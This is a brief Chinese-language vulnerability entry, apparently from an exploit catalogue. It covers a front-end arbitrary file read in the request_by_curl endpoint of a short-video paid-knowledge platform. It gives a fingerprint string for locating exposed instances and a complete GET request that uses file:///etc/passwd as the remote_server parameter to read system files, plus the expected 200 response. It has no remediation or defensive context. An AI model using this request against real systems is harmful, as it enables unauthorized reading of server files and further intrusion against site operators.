# 短视频系统视频知识付费系统request_by_curl存在前台任意文件读取漏洞

短视频系统视频知识付费系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"testvideo://login?id="`
- **请求**：`GET /index/index/request_by_curl?remote_server=file:///etc/passwd&post_string=1 HTTP/1.1`
- **响应特征**：200